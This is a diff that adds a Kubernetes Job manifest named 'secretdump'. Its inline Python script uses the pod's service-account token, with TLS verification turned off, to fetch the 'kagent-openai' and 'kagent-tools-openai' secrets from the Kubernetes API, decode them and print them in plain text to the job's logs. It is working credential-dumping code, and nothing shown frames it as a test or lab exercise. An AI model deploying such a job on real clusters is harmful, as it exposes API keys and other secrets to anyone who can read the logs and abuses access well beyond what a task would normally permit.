@@ -1,0 +1,37 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: tmp-i67954-secretdump
+  namespace: kagent
+  labels:
+    tmp: i67954
+spec:
+  ttlSecondsAfterFinished: 86400
+  backoffLimit: 0
+  template:
+    metadata:
+      labels: {tmp: i67954}
+    spec:
+      serviceAccountName: kagent-tools
+      restartPolicy: Never
+      containers:
+      - name: dump
+        image: ghcr.io/kagent-dev/kagent/tools:0.2.1
+        imagePullPolicy: IfNotPresent
+        command: ["python3","-c"]
+        args:
+        - |
+          import os,urllib.request,json,base64,ssl
+          ctx=ssl._create_unverified_context()
+          t=open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+          out={}
+          for ns,names in [('kagent',['kagent-openai','kagent-tools-openai'])]:
+            for n in names:
+              try:
+                r=urllib.request.Request(f'https://kubernetes.default.svc/api/v1/namespaces/{ns}/secrets/{n}',headers={'Authorization':'Bearer '+t})
+                d=json.load(urllib.request.urlopen(r,context=ctx))
+                out[n]={k:base64.b64decode(v).decode() for k,v in d['data'].items()}
+              except Exception as e:
+                out[n]='ERR '+str(e)
+          print('===SECRETS===')
+          print(json.dumps(out,indent=1))
